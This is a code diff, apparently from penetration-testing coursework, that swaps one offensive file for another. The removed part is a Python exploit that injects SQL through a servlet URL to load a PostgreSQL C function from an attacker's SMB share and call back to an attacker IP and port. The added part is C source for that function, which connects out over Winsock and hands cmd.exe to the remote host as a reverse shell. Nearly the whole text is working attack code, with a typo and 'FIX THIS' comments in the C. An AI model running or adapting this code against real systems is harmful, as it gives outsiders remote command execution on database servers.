@@ -1,75 +1,56 @@
-import requests
-import argparse
-import sys
-# Disable SSL warnings
-requests.packages.urllib3.disable_warnings()
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#include "postgres.h"
+#include <string.h>
+#include "fmgr.h"
+#include "utils/geo_decls.h"
+#include <stdio.h>
+#include <winsock2.h>
+#include "utils/builtins.h"
+#pragma comment(lib, "ws2_32")
 
-"""
-This exploit will work only if the attacker is on the same network as the target system.
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
 
-Usage:
-/usr/bin/python3 exploit.py <target_ip:port> <attacker_ip> <listener_port>
-"""
+/* Add a prototype marked PGDLLEXPORT */
+PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
+PG_FUNCTION_INFO_V1(connect_back);
 
-def log(msg):
-    print(f"[+] {msg}")
+WSADATA wsaData;
+SOCKET s1;
+struct sockaddr_in hax;
+char ip_addr[16];
+STARTUPINFO sui;
+PROCESS_INFORMATION pi;
 
-def make_request(url, sql):
-    try:
-        formatted_url = url % sql
-        log(f"[*] Executing query (truncated): {sql[:80]}...")
-        response = requests.get(formatted_url, verify=False, timeout=20)
-        if response.status_code != 200:
-            log(f"[!] Warning: Received HTTP {response.status_code}")
-        return response
-    except requests.RequestException as e:
-        log(f"[!] Request failed: {e}")
-        return None
+Datum
+connect_back(PG_FUNCTION_ARGS)
+{
 
-def create_udf_func(url, attacker_ip):
-    log("Creating UDF function for reverse shell...")
-    try:
-        # Escape backslashes for SQL and Python strings
-        dll_path = f"\\\\{attacker_ip}\\awae\\rev_shell.dll"
-        sql = (
-            f"CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS "
-            f"$$ {dll_path} $$, $$connect_back$$ LANGUAGE C STRICT"
-        )
-        return make_request(url, sql)
-    except Exception as e:
-        log(f"[!] Failed to create UDF function: {e}")
-        return None
+	/* convert C string to text pointer */
+#define GET_TEXT(cstrp) \
+   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))
 
-def trigger_udf(url, attacker_ip, port):
-    log("Triggering reverse shell...")
-    try:
-        sql = f"SELECT rev_shell($${attacker_ip}$$, {int(port)})"
-        return make_request(url, sql)
-    except Exception as e:
-        log(f"[!] Failed to trigger reverse shell: {e}")
-        return None
+	/* convert text pointer to C string */
+#define GET_STR(textp) \
+  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
 
-def main():
-    parser = argparse.ArgumentParser(description="Automate SQLi-based reverse shell through UDF")
-    parser.add_argument("server", help="Target server in format IP:port")
-    parser.add_argument("attacker", help="Attacker IP address (e.g. for hosting SMB share)")
-    parser.add_argument("port", type=int, help="Port for reverse shell to connect to")
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
-    args = parser.parse_args()
+	hax.sin_family = AF_INET;
+	/* FIX THIS */
+	hax.sin_port = htons(PG_GETARG_INT32(1));
+	/* FIX THIS TOO*/
+	hax.sin_addr.s_addr = inet_adder(GET_STR(PG_GETARG_TEXT_P(0)));
 
-    sqli_url = f"https://{args.server}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
+	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
 
-    if create_udf_func(sqli_url, args.attacker):
-        trigger_udf(sqli_url, args.attacker, args.port)
-    else:
-        log("[-] UDF function creation failed. Aborting shell trigger.")
+	memset(&sui, 0, sizeof(sui));
+	sui.cb = sizeof(sui);
+	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;
 
-if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n[!] Script interrupted by user.")
-        sys.exit(1)
-    except Exception as e:
-        print(f"[!] Unhandled error: {e}")
-        sys.exit(1)
+	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+	PG_RETURN_VOID();
+}
